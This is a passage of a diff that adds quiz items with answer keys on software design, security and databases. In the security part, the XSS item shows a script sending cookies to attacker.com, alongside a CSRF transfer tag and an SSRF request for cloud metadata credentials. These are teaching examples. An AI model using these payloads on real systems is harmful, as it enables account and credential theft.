+    "postanswer": "// Law of Demeter Violation (Train Wreck):\n// order.getCustomer().getAddress().getCity().getPostalCode();\n// If the structure of Address changes, Order's caller breaks!\n//\n// Clean Demeter Adherence (Tell, Don't Ask):\n// order.getCustomerPostalCode();\n// Each unit only has knowledge of its direct collaborators."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Postel's Law (Robustness Principle)",
+    "options": {
+      "a": "API endpoints must deprecate legacy endpoints within 90 days of releasing a major version.",
+      "b": "Software should reject any network packet that fails cryptographic checksum validation without inspection.",
+      "c": "Relational database tables should enforce strict foreign key constraints across all transactional tables.",
+      "d": "Be conservative in what you send, and liberal in what you accept (e.g. generate clean outputs, tolerate imperfect inputs)."
+    },
+    "answer": "d",
+    "postanswer": "// Postel's Law (Jon Postel - RFC 793):\n// 'Be conservative in what you do, be liberal in what you accept from others.'\n// Application in API Design:\n// - When emitting data: Strictly conform to JSON specifications, exact typing, and documentation.\n// - When consuming data: Ignore unknown fields gracefully, accept flexible date formats, don't crash on extra whitespace."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "SOLID: Single Responsibility Principle (SRP)",
+    "options": {
+      "a": "A class or module should have one, and only one, reason to change (gather together things that change for the same reason).",
+      "b": "A microservice should execute exactly one HTTP request at a time to prevent multithreaded race conditions.",
+      "c": "A software engineer should work on only one pull request at a time during an active sprint cycle.",
+      "d": "A database table should contain exactly one primary key column and no foreign key references."
+    },
+    "answer": "a",
+    "postanswer": "// Single Responsibility Principle (Robert C. Martin):\n// Violation:\n// class UserReport {\n//   func calculatePay() { ... }     // Changes when CFO changes finance policy\n//   func saveToDatabase() { ... }   // Changes when DBA changes database schema\n//   func printReport() { ... }      // Changes when COO changes visual format\n// }\n// Split into: PaymentCalculator, UserRepository, ReportFormatter."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "SOLID: Open/Closed Principle (OCP)",
+    "options": {
+      "a": "Open source libraries should never be closed or re-licensed under commercial dual-licensing terms.",
+      "b": "Software entities should be open for extension, but closed for modification.",
+      "c": "API connections must remain open during transactions but close immediately upon receiving 200 OK.",
+      "d": "Classes should keep member fields open as public properties while keeping methods closed as private."
+    },
+    "answer": "b",
+    "postanswer": "// Open/Closed Principle (Bertrand Meyer):\n// Anti-pattern (Modification):\n// func calculateDiscount(customer) {\n//   if customer.type == 'VIP' return 0.2\n//   if customer.type == 'STUDENT' return 0.1 // Modifying core logic for every new customer type!\n// }\n// OCP Pattern (Extension via Polymorphism):\n// interface DiscountPolicy { func calculate(): float }\n// VIPPolicy implements DiscountPolicy; StudentPolicy implements DiscountPolicy;"
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "SOLID: Liskov Substitution Principle (LSP)",
+    "options": {
+      "a": "Microservices in a cluster can be swapped with serverless cloud functions without altering client latency.",
+      "b": "Relational database tables can be substituted with NoSQL document collections without changing business logic.",
+      "c": "Subtypes must be substitutable for their base types without altering the correctness of the program.",
+      "d": "Synchronous HTTP endpoints should be substitutable with asynchronous WebSockets transparently."
+    },
+    "answer": "c",
+    "postanswer": "// Liskov Substitution Principle (Barbara Liskov):\n// Classic Violation:\n// class Rectangle { setWidth(w); setHeight(h); }\n// class Square extends Rectangle {\n//   setWidth(w) { this.width = w; this.height = w; } // Breaks callers expecting independent height!\n// }\n// If code expects a Rectangle and you pass a Square, it behaves incorrectly.\n// Subclasses must adhere to contracts and invariants of base classes."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "SOLID: Interface Segregation Principle (ISP)",
+    "options": {
+      "a": "Database interfaces must be segregated from application business logic using an Object-Relational Mapper (ORM).",
+      "b": "Public API gateways should enforce separate rate limiting tiers for mobile clients versus desktop clients.",
+      "c": "Frontend user interfaces must be physically hosted on separate origin domains from backend API servers.",
+      "d": "Clients should not be forced to depend upon interfaces that they do not use (prefer small, role-specific interfaces)."
+    },
+    "answer": "d",
+    "postanswer": "// Interface Segregation Principle:\n// Bloated Interface (Violation):\n// interface Worker { func work(); func eat(); func sleep(); }\n// class RobotWorker implements Worker {\n//   func eat() { throw UnsupportedOperationException() } // Smelly!\n// }\n// Segregated Interfaces:\n// interface Workable { func work() }\n// interface Feedable { func eat() }\n// RobotWorker only implements Workable."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "SOLID: Dependency Inversion Principle (DIP)",
+    "options": {
+      "a": "High-level modules should not depend on low-level modules; both should depend on abstractions. Abstractions should not depend on details.",
+      "b": "Package managers must resolve transitive library dependencies in reverse alphabetical order to avoid circular imports.",
+      "c": "Frontend client applications should inject compiled CSS files at the end of the HTML document head.",
+      "d": "Database migration scripts should depend on raw SQL statements rather than ORM entity classes."
+    },
+    "answer": "a",
+    "postanswer": "// Dependency Inversion Principle:\n// Direct Dependency (Tight Coupling):\n// class OrderService {\n//   private sqlDatabase = new PostgresConnection(); // High-level depends on low-level!\n// }\n// Inverted Dependency (Loose Coupling via DI):\n// interface OrderRepository { func save(order: Order) }\n// class OrderService {\n//   constructor(private repo: OrderRepository) {} // Injected via constructor!\n// }"
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "DRY vs WET vs AHA",
+    "options": {
+      "a": "DRY, WET, and AHA are cloud cost optimization tiers for cold, warm, and archive object storage.",
+      "b": "DRY is Don't Repeat Yourself, WET is Write Everything Twice, and AHA is Avoid Hasty Abstractions (favor duplication over the wrong abstraction).",
+      "c": "DRY applies to database normalization, WET applies to frontend templating, and AHA applies to machine learning.",
+      "d": "They are network compression algorithms used to compress HTTP response payloads across CDN edge nodes."
+    },
+    "answer": "b",
+    "postanswer": "// Sandi Metz / Kent C. Dodds on Code Abstraction:\n// - DRY : Don't Repeat Yourself (Consolidate duplicate knowledge).\n// - WET : Write Everything Twice (Wait until you have 3 distinct use cases before abstracting).\n// - AHA : Avoid Hasty Abstractions! \n// 'Duplication is far cheaper than the wrong abstraction.'\n// An overly clever premature abstraction forces unrelated features to share warped parameters."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Strangler Fig Pattern",
+    "options": {
+      "a": "An anti-pattern where a slow microservice exhausts upstream thread pools until the entire cluster dies.",
+      "b": "A software testing technique that aggressively truncates long-running test suites to speed up CI runs.",
+      "c": "Gradually replacing a legacy system by incrementally replacing specific pieces of functionality with new services until the old system is retired.",
+      "d": "A database compaction strategy that deletes obsolete table partitions during low-traffic overnight hours."
+    },
+    "answer": "c",
+    "postanswer": "// Strangler Fig Pattern (Martin Fowler):\n// Named after the Australian strangler fig vine that grows around a host tree until it replaces it.\n// Architecture Flow:\n// Client Requests ---> [Reverse Proxy / API Gateway]\n//                          ├── /checkout -> Routed to NEW Microservice\n//                          ├── /search   -> Routed to NEW Microservice\n//                          └── /*        -> Routed to LEGACY Monolith\n// Avoids catastrophic 'Big Bang' rewrites by migrating feature-by-feature in production."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "OAuth 2.0 vs OpenID Connect (OIDC)",
+    "options": {
+      "a": "OAuth 2.0 is designed exclusively for enterprise LDAP servers, while OIDC is designed for consumer mobile apps.",
+      "b": "OAuth 2.0 and OIDC are competing incompatible standards for session cookie management.",
+      "c": "OAuth 2.0 encrypts network payloads, while OIDC verifies client TLS certificates.",
+      "d": "OAuth 2.0 provides authorization (delegated access via access tokens), while OIDC adds an identity and authentication layer (ID tokens)."
+    },
+    "answer": "d",
+    "postanswer": "// OAuth 2.0 vs OIDC:\n// - OAuth 2.0 (Authorization): 'Can this app access your Google Drive photos on your behalf?'\n//   -> Yields: Access Token (opaque or JWT) passed in Authorization: Bearer <token>\n// - OIDC (Authentication): 'Who is the currently logged-in user?'\n//   -> Built on top of OAuth 2.0\n//   -> Yields: ID Token (signed JWT containing 'sub', 'email', 'name', etc.)"
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "JWT (JSON Web Token)",
+    "options": {
+      "a": "A compact, URL-safe means of representing claims between two parties, structured into three base64url parts: Header, Payload, and Signature.",
+      "b": "A binary encryption algorithm used to hash passwords before storing them in relational database tables.",
+      "c": "An HTTP header specification used to compress JSON payloads across high-latency cellular connections.",
+      "d": "A proprietary session format used exclusively in Google Chrome browser extensions."
+    },
+    "answer": "a",
+    "postanswer": "// Anatomy of a JWT: xxxxx.yyyyy.zzzzz\n// 1. Header    (base64url): { \"alg\": \"RS256\", \"typ\": \"JWT\" }\n// 2. Payload   (base64url): { \"sub\": \"user_123\", \"role\": \"admin\", \"exp\": 1717000000 }\n// 3. Signature (HMAC/RSA) : RSASHA256(base64Url(Header) + \".\" + base64Url(Payload), privateKey)\n// Critical SWE Rule: Payloads are SIGNED, NOT ENCRYPTED (anyone can read the base64 payload!). Never put secrets in JWTs."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "PKCE (Proof Key for Code Exchange)",
+    "options": {
+      "a": "A public key encryption algorithm used to establish SSH connections to remote server terminals.",
+      "b": "An extension to OAuth 2.0 authorization code flow that protects public clients (SPAs, mobile apps) against authorization code interception attacks.",
+      "c": "A cryptographic database protocol used to encrypt table columns at rest using envelope encryption.",
+      "d": "A mutual TLS authentication handshake executed between microservices inside a service mesh."
+    },
+    "answer": "b",
+    "postanswer": "// PKCE (Pronounced 'pixy' - RFC 7636):\n// Solves: Public clients (React apps, iOS apps) cannot securely store client_secret.\n// Flow:\n// 1. Client creates random secret: code_verifier\n// 2. Client hashes it: code_challenge = SHA256(code_verifier)\n// 3. Client sends code_challenge with /authorize request\n// 4. Client exchanges auth_code + original code_verifier with /token\n// 5. Auth Server hashes verifier to confirm it matches challenge -> Issues token!"
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "RBAC vs ABAC",
+    "options": {
+      "a": "RBAC encrypts symmetric keys, while ABAC encrypts asymmetric cryptographic key pairs.",
+      "b": "RBAC is used for database indexing, while ABAC is used for message queue routing.",
+      "c": "RBAC grants permissions based on static roles, whereas ABAC grants permissions dynamically based on attributes (user, resource, environment).",
+      "d": "RBAC is an agile project management term, while ABAC is an SRE incident metric."
+    },
+    "answer": "c",
+    "postanswer": "// RBAC vs ABAC Comparison:\n// - RBAC (Role-Based Access Control):\n//   User -> Role ('Editor') -> Permissions ['edit_post', 'view_post']\n//   Limitation: Hard to express: 'Can edit posts ONLY if post is a draft AND department matches'\n// - ABAC (Attribute-Based Access Control):\n//   Rule: Allow if (user.dept == resource.dept AND time.hour < 18 AND resource.status == 'DRAFT')"
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Mutual TLS (mTLS)",
+    "options": {
+      "a": "A web browser caching mechanism that stores SSL certificates in local storage.",
+      "b": "A load balancing algorithm that duplicates TCP connection handshakes across dual network switches.",
+      "c": "An encryption scheme where database backups are encrypted with two distinct private keys simultaneously.",
+      "d": "A two-way authentication process where both the client and server authenticate each other using X.509 digital certificates."
+    },
+    "answer": "d",
+    "postanswer": "// Mutual TLS (mTLS) in Service Meshes (Envoy / Istio):\n// Standard TLS: Client verifies Server identity (e.g. browser trusts bank.com).\n// mTLS: Server ALSO verifies Client certificate!\n// 1. Service A connects to Service B.\n// 2. Service B presents its cert -> Service A verifies it.\n// 3. Service A presents its client cert -> Service B verifies it.\n// Result: Zero-trust wire encryption + cryptographic identity verification for every microservice call."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Zero Trust Architecture (ZTA)",
+    "options": {
+      "a": "A security model based on the principle of 'never trust, always verify', requiring strict identity verification for every user and device, even inside the perimeter.",
+      "b": "A software development culture where developers refuse to review pull requests submitted by other teams.",
+      "c": "A testing framework that deletes all mock data from integration test suites to ensure real database execution.",
+      "d": "A cloud architecture that eliminates external internet gateways by hosting services solely on local on-premise hardware."
+    },
+    "answer": "a",
+    "postanswer": "// Zero Trust Core Tenet:\n// Traditional: 'Castle and Moat' -> Hard outer firewall, but once inside the VPN, all servers trust each other.\n// Zero Trust:\n// Perimeter assumption is dead. Assume attackers are ALREADY on the internal network.\n// Requirements:\n// 1. Authenticate and authorize every request explicitly (mTLS, OIDC).\n// 2. Least privilege access.\n// 3. Continuous monitoring and micro-segmentation."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Principle of Least Privilege (PoLP)",
+    "options": {
+      "a": "Limiting the number of software engineers permitted to submit pull requests on core repositories.",
+      "b": "Giving a user, process, or system only the minimum necessary permissions required to perform its valid function, and nothing more.",
+      "c": "Restricting microservice CPU utilization to less than 50% during non-peak business hours.",
+      "d": "Ensuring database transactions acquire row-level locks rather than table-level locks."
+    },
+    "answer": "b",
+    "postanswer": "// Principle of Least Privilege in AWS IAM:\n// Anti-pattern (Over-permissioned):\n//   Effect: 'Allow', Action: '*', Resource: '*'\n//   If microservice is compromised via SSRF, attacker has total cloud control!\n// PoLP Pattern:\n//   Effect: 'Allow'\n//   Action: ['s3:GetObject']\n//   Resource: 'arn:aws:s3:::customer-invoices/${aws:PrincipalTag/OrgId}/*'\n// Limits blast radius to minimum required surface."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Defense in Depth",
+    "options": {
+      "a": "Writing unit tests, integration tests, end-to-end tests, and performance benchmarks for every codebase module.",
+      "b": "Deploying Kubernetes clusters across at least three geographic cloud regions simultaneously.",
+      "c": "A cybersecurity strategy employing multiple layers of defensive controls throughout an information technology system to protect assets.",
+      "d": "Stashing database write logs across multiple NVMe drives to prevent transaction data loss."
+    },
+    "answer": "c",
+    "postanswer": "// Defense in Depth Layering:\n// 1. Edge/Network: Cloudflare WAF, DDoS protection, rate limiting.\n// 2. Gateway/Ingress: TLS termination, IP whitelisting, CORS, CSP.\n// 3. Application: Input validation, parameterized queries, OIDC auth, RBAC.\n// 4. Service Mesh: mTLS, network policies, egress filtering.\n// 5. Data: Encryption at rest (AES-256), column-level masking, audit logging.\n// If any single layer fails, subsequent layers prevent total compromise."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "CORS (Cross-Origin Resource Sharing)",
+    "options": {
+      "a": "An HTTP header that compresses image payloads when requested from mobile devices.",
+      "b": "A server-to-server protocol used to replicate database records across different cloud availability zones.",
+      "c": "A backend caching framework that distributes REST responses across multiple proxy servers.",
+      "d": "A browser security mechanism allowing a server to declare which external origins are permitted to read its responses."
+    },
+    "answer": "d",
+    "postanswer": "// CORS Essentials:\n// Same-Origin Policy (SOP): Browsers block https://evil.com from reading data from https://yourbank.com/api/balance.\n// CORS Headers (Sent by server to allow cross-origin reads):\n// Access-Control-Allow-Origin: https://app.trusted-partner.com\n// Access-Control-Allow-Methods: GET, POST, OPTIONS\n// Preflight (OPTIONS): Sent automatically by browser for complex requests before the actual request."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Cross-Site Scripting (XSS) vs CSRF",
+    "options": {
+      "a": "XSS injects malicious client-side code into the victim's browser, while CSRF tricks an authenticated user's browser into executing unwanted actions.",
+      "b": "XSS attacks database SQL servers, while CSRF attacks network domain name servers (DNS).",
+      "c": "XSS targets backend microservice containers, while CSRF targets mobile push notification services.",
+      "d": "XSS and CSRF are identical terms describing buffer overflow attacks in C++ runtimes."
+    },
+    "answer": "a",
+    "postanswer": "// XSS vs CSRF:\n// - XSS (Cross-Site Scripting):\n//   Attacker injects <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\n//   Mitigation: Output encoding, Content Security Policy (CSP), HttpOnly cookies.\n// - CSRF (Cross-Site Request Forgery):\n//   User is logged into bank.com. Visits malicious site with <img src='https://bank.com/transfer?amount=1000&to=attacker'>\n//   Mitigation: SameSite=Strict cookies, Anti-CSRF tokens."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Content Security Policy (CSP)",
+    "options": {
+      "a": "A legal privacy document required by the European Union under GDPR for user data processing.",
+      "b": "An HTTP response header allowing site administrators to declare approved sources of content that browsers are permitted to load and execute.",
+      "c": "A content delivery network caching policy controlling how edge nodes invalidate static image files.",
+      "d": "A backend database constraint that restricts the character length of text columns in SQL schemas."
+    },
+    "answer": "b",
+    "postanswer": "// Content Security Policy (CSP) Header Example:\n// Content-Security-Policy: \n//   default-src 'self'; \n//   script-src 'self' https://apis.google.com; \n//   style-src 'self' 'nonce-rAnd0m123'; \n//   object-src 'none'; \n//   frame-ancestors 'none';\n// Defeats XSS by instructing browser to refuse inline <script> tags or scripts from unauthorized domains!"
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "Server-Side Request Forgery (SSRF)",
+    "options": {
+      "a": "A network error where DNS servers return mismatched IP addresses for cloud load balancers.",
+      "b": "A vulnerability where clients forge JWT token signatures using broken HMAC keys.",
+      "c": "An attack where a threat actor abuses server functionality to force the backend server to make unauthorized requests to internal-only resources.",
+      "d": "When client browsers submit forged CSRF tokens in order to bypass web application firewalls."
+    },
+    "answer": "c",
+    "postanswer": "// SSRF in Action (Capital One Breach style):\n// Vulnerable endpoint: POST /api/fetch-avatar { \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }\n// Server naively executes HTTP GET from its own AWS EC2 environment.\n// AWS metadata service returns instance IAM role credentials to attacker!\n// Defense: Egress firewalls, IMDSv2 (requires session token), strict URL allowlists."
+  },
+  {
+    "category": "Security, Auth & Networking",
+    "title": "ReDoS (Regular Expression Denial of Service)",
+    "options": {
+      "a": "A database query planner bug where regex LIKE matches bypass table B-Tree indexes.",
+      "b": "A brute-force network attack that saturates DNS servers with repeated regex pattern queries.",
+      "c": "A memory leak caused by compiling regular expressions repeatedly inside tight JavaScript loops.",
+      "d": "A denial-of-service attack caused by catastrophic backtracking in unoptimized regex patterns when evaluating malicious input."
+    },
+    "answer": "d",
+    "postanswer": "// Catastrophic Backtracking (ReDoS):\n// Vulnerable Regex: ^(a+)+$\n// String 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'\n// Engine tries every possible combination of splits: O(2^N) exponential complexity!\n// For N=30, computation requires 1,000,000,000 steps -> 100% CPU lockup on Node.js single thread.\n// Defense: Linear time regex engines (RE2), input length limits, timeouts."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "ACID vs BASE",
+    "options": {
+      "a": "ACID is for relational databases (Atomicity, Consistency, Isolation, Durability); BASE is for distributed stores (Basically Available, Soft state, Eventual consistency).",
+      "b": "ACID refers to SQL syntax compilation, while BASE refers to NoSQL JSON document serialization formats.",
+      "c": "ACID is a frontend state management framework, while BASE is a cloud object storage protocol.",
+      "d": "ACID and BASE are identical database durability certifications governed by ISO/IEC standards."
+    },
+    "answer": "a",
+    "postanswer": "// ACID vs BASE Paradigms:\n// - ACID (Pessimistic / Strict):\n//   Atomicity: All-or-nothing\n//   Consistency: Valid database invariants\n//   Isolation: Concurrent transactions don't interfere\n//   Durability: Committed data survives crashes\n// - BASE (Optimistic / Distributed):\n//   Basically Available: High availability guaranteed\n//   Soft state: State may fluctuate over time without user input\n//   Eventual consistency: System converges over time"
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "OLTP vs OLAP vs HTAP",
+    "options": {
+      "a": "OLTP is used exclusively for machine learning pipelines, OLAP is for mobile apps, and HTAP is for edge CDNs.",
+      "b": "OLTP is for fast row-oriented transactional processing, OLAP is for complex columnar analytical queries, and HTAP handles both concurrently.",
+      "c": "OLTP, OLAP, and HTAP are database encryption algorithms used for sensitive financial data.",
+      "d": "OLTP handles graph database queries, OLAP handles relational tables, and HTAP handles key-value caches."
+    },
+    "answer": "b",
+    "postanswer": "// Workload Spectrum:\n// 1. OLTP (Online Transaction Processing - e.g. Postgres, MySQL):\n//    - High volume of simple, low-latency queries (SELECT/INSERT/UPDATE by ID).\n//    - Row-oriented storage layout.\n// 2. OLAP (Online Analytical Processing - e.g. ClickHouse, Snowflake, BigQuery):\n//    - Long-running scans across billions of records (SUM, AVG, GROUP BY).\n//    - Columnar storage layout.\n// 3. HTAP (Hybrid Transactional/Analytical Processing - e.g. TiDB, SingleStore)."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Read-Your-Writes (Read-After-Write Consistency)",
+    "options": {
+      "a": "A caching rule where read operations are executed from disk while write operations are buffered in RAM.",
+      "b": "A database constraint that prohibits users from reading table records until all active write locks are cleared.",
+      "c": "A consistency guarantee ensuring that once a user updates a data item, any subsequent read by that same user will observe the updated value.",
+      "d": "A transaction mode where write queries automatically echo back the modified row in the HTTP response body."
+    },
+    "answer": "c",
+    "postanswer": "// Read-Your-Writes Problem in Asynchronous Replication:\n// 1. User updates profile picture -> Written to Primary DB.\n// 2. Browser immediately redirects and fetches profile picture from Read Replica.\n// 3. Replica has 300ms replication lag -> User sees their old picture! (Frustration!)\n// Solution:\n// - Route user's reads to Primary for 5 seconds after a write.\n// - Pin session reads to replica only if replica's LSN >= user's write LSN."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Isolation Levels: Dirty Read, Non-Repeatable Read, Phantom Read",
+    "options": {
+      "a": "Three network packet anomalies that occur when TCP connections drop packets during retransmission.",
+      "b": "Three memory corruption errors in multi-core processors executing asynchronous memory barriers.",
+      "c": "Three database disk errors that occur when write-ahead log files are corrupted during power loss.",
+      "d": "Three concurrency phenomena: reading uncommitted data (Dirty), reading modified data mid-transaction (Non-Repeatable), and reading newly inserted rows (Phantom)."
+    },
+    "answer": "d",
+    "postanswer": "// SQL Standard Isolation Levels vs Anomalies:\n// Level               | Dirty Read | Non-Repeatable Read | Phantom Read\n// --------------------+------------+---------------------+-------------\n// Read Uncommitted    | YES        | YES                 | YES\n// Read Committed      | NO         | YES                 | YES\n// Repeatable Read     | NO         | NO                  | YES (in standard)\n// Serializable        | NO         | NO                  | NO"
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Write Skew",
+    "options": {
+      "a": "A race condition where concurrent transactions read overlapping state, make disjoint updates based on that state, and violate an application invariant.",
+      "b": "An imbalance in distributed database shards where one node receives 90% of write traffic.",
+      "c": "A physical disk sector degradation caused by repeatedly overwriting the same NAND flash block.",
+      "d": "When database WAL logs are written out-of-order due to asynchronous Linux file system flushes."
+    },
+    "answer": "a",
+    "postanswer": "// Write Skew Classic Example (Doctors On Call):\n// Invariant: At least 1 doctor must be on call at all times.\n// State: Alice and Bob are both currently on call.\n// - Tx 1 (Alice): Checks if count(on_call) > 1 -> Yes (2). Alice goes off call.\n// - Tx 2 (Bob)  : Checks if count(on_call) > 1 -> Yes (2). Bob goes off call.\n// Under Repeatable Read / Snapshot Isolation: BOTH transactions commit successfully!\n// Result: 0 doctors on call (Invariant broken!).\n// Fix: Strict Serializable isolation or SELECT ... FOR UPDATE."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Multi-Version Concurrency Control (MVCC)",
+    "options": {
+      "a": "A git branching strategy that manages concurrent releases across multiple open-source project versions.",
+      "b": "A concurrency control method where database engines maintain multiple versions of data items so readers do not block writers and writers do not block readers.",
+      "c": "A microservice deployment technique where multiple versions of an API run in production simultaneously.",
+      "d": "A database schema versioning tool that records every ALTER TABLE statement in an audit table."
+    },
+    "answer": "b",
+    "postanswer": "// MVCC Mechanics in PostgreSQL:\n// When you UPDATE a row:\n// - Postgres does NOT overwrite the row on disk.\n// - It marks the old row's xmax = current_tx_id (now dead to future transactions).\n// - It inserts a brand NEW row with xmin = current_tx_id.\n// Concurrent readers continue reading the old version without waiting for locks!\n// VACUUM later cleans up dead row versions (garbage collection)."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "LSM-Tree vs B-Tree",
+    "options": {
+      "a": "B-Trees store data in flat text files, while LSM-Trees store data in memory-mapped binary trees.",
+      "b": "B-Trees are used exclusively in graph databases, while LSM-Trees are used exclusively in relational databases.",
+      "c": "B-Trees optimize for read throughput with in-place updates; LSM-Trees optimize for write throughput by writing to memory and sequentially appending to SSTables.",
+      "d": "B-Trees and LSM-Trees are identical indexing structures with different patent licensing restrictions."
+    },
+    "answer": "c",
+    "postanswer": "// B-Tree vs LSM-Tree Comparison:\n// 1. B-Tree (PostgreSQL, MySQL InnoDB, SQLite):\n//    - In-place page updates (random disk I/O).\n//    - Fast reads (predictable O(log N) tree traversal).\n// 2. LSM-Tree (Log-Structured Merge-Tree - RocksDB, Cassandra, Bigtable):\n//    - Writes go to MemTable (RAM) + sequential WAL (fast!).\n//    - Flushed as immutable SSTables to disk; background compaction merges them.\n//    - Exceptional write throughput; reads may require checking multiple SSTables + Bloom filters."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Write Amplification vs Read Amplification",
+    "options": {
+      "a": "Write Amplification is an agile metric measuring code churn, while Read Amplification measures code review comments.",
+      "b": "Write Amplification measures network packet duplication, while Read Amplification measures CDN cache hit rates.",
+      "c": "They measure the ratio of SQL queries generated by an Object-Relational Mapper relative to hand-written SQL.",
+      "d": "Write Amplification is the ratio of bytes written to storage vs bytes requested; Read Amplification is the number of disk reads needed per logical read."
+    },
+    "answer": "d",
+    "postanswer": "// Storage Amplification Metrics:\n// - Write Amplification (WA):\n//   Application requests to write 100 bytes.\n//   Due to WAL + page allocation + SSTable compaction, storage writes 1,000 bytes.\n//   WA = 1000 / 100 = 10x. High WA wears out SSD flash endurance.\n// - Space Amplification: Ratio of total database file size to actual raw user data size.\n// - Read Amplification: Reading 1 row requires scanning 5 different disk blocks."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Bloom Filter",
+    "options": {
+      "a": "A space-efficient probabilistic data structure used to test whether an element is definitely not in a set or may be in a set.",
+      "b": "A cryptographic hash function used to detect data tampering across distributed blockchain networks.",
+      "c": "An image compression algorithm used to render blurred thumbnails during web page pre-loading.",
+      "d": "A routing algorithm used in peer-to-peer networks to calculate shortest network paths between nodes."
+    },
+    "answer": "a",
+    "postanswer": "// Bloom Filter Guarantees:\n// - False Negatives: IMPOSSIBLE (If it says 'NO', element is 100% NOT in the set).\n// - False Positives: POSSIBLE (If it says 'YES', element MIGHT be in the set).\n// Usage in Databases (RocksDB / Cassandra):\n// Before doing expensive disk I/O to check an SSTable for a key, check the in-memory Bloom filter.\n// If Bloom filter returns FALSE -> Skip disk read entirely! Huge latency savings."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Optimistic vs Pessimistic Concurrency Control (OCC vs PCC)",
+    "options": {
+      "a": "OCC is used for batch processing jobs, while PCC is used for real-time video streaming.",
+      "b": "PCC acquires locks upfront assuming conflicts will happen; OCC allows transactions to proceed without locks, validating for conflicts before commit.",
+      "c": "PCC encrypts database columns before saving, while OCC encrypts records during network transmission.",
+      "d": "OCC and PCC are competing CPU instruction set architectures used in ARM server processors."
+    },
+    "answer": "b",
+    "postanswer": "// Concurrency Strategies:\n// - Pessimistic (PCC - e.g. SELECT ... FOR UPDATE):\n//   Best when contention is high.\n//   Locks rows immediately. Other transactions wait in queue until commit/rollback.\n// - Optimistic (OCC - e.g. WHERE version = @current_version):\n//   Best when contention is low (reads vastly outnumber writes).\n//   UPDATE products SET stock = stock - 1, version = version + 1 \n//   WHERE id = 42 AND version = 5;\n//   If affected_rows == 0, another transaction updated first -> Retry!"
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Compare-And-Swap (CAS)",
+    "options": {
+      "a": "A database indexing strategy that swaps B-Tree leaf pages with hash map buckets during heavy query loads.",
+      "b": "A cloud storage migration protocol that copies files between AWS S3 and Google Cloud Storage.",
+      "c": "An atomic CPU instruction that compares the contents of a memory location with a given value and, only if they match, modifies the contents to a new given value.",
+      "d": "A network protocol that swaps TCP SYN packets with UDP datagrams to bypass firewalls."
+    },
+    "answer": "c",
+    "postanswer": "// Compare-And-Swap (CAS) - Foundation of Lock-Free Concurrency:\n// bool CAS(int* ptr, int expected, int new_value) {\n//   if (*ptr == expected) {\n//     *ptr = new_value;\n//     return true; // Success!\n//   }\n//   return false; // Changed by another thread!\n// }\n// Powers atomic primitives like Java's AtomicInteger, Go's sync/atomic, and lock-free queues."
+  },
+  {
+    "category": "Data Storage, Consistency & Concurrency",
+    "title": "Starvation vs Deadlock vs Livelock",
+    "options": {
+      "a": "Starvation, Deadlock, and Livelock describe container scaling states in Kubernetes pod autoscalers.",
+      "b": "Deadlock refers to disk failure, Livelock refers to memory exhaustion, and Starvation refers to CPU overheating.",
+      "c": "They are three stages of database connection pool initialization in Apache Tomcat servers.",
+      "d": "Deadlock: threads waiting on each other indefinitely; Livelock: threads active and changing state but making no progress; Starvation: a thread is perpetually denied resources."
+    },
+    "answer": "d",
+    "postanswer": "// Concurrency Pitfalls:\n// 1. Deadlock : Thread A holds Lock 1, waits for Lock 2; Thread B holds Lock 2, waits for Lock 1. Both frozen forever.\n// 2. Livelock : Two polite people in a hallway repeatedly stepping in the same direction to let the other pass. States change, but zero progress!\n// 3. Starvation: High-priority threads continuously consume the CPU/lock pool; a low-priority thread never gets executed."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "DORA Metrics",
+    "options": {
+      "a": "Four key software delivery metrics: Deployment Frequency, Lead Time for Changes, Change Failure Rate, and Time to Restore Service.",
+      "b": "Database operational metrics: Disk usage, Operation latency, Replication lag, and Availability percentage.",
+      "c": "Frontend engineering benchmarks: DOM depth, Onload time, Render latency, and Asset bundle size.",
+      "d": "Product management KPIs: Daily active users, Organic growth rate, Retention rate, and Average revenue per user."
+    },
+    "answer": "a",
+    "postanswer": "// DORA Metrics (DevOps Research and Assessment):\n// 1. Deployment Frequency    : How often organization successfully releases to production.\n// 2. Lead Time for Changes   : Time from commit to running in production.\n// 3. Change Failure Rate     : % of deployments requiring hotfixes, rollbacks, or patches.\n// 4. Time to Restore Service : How long it takes to recover from an incident in production.\n// Elite performers deploy multiple times per day with lead times under 1 hour."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
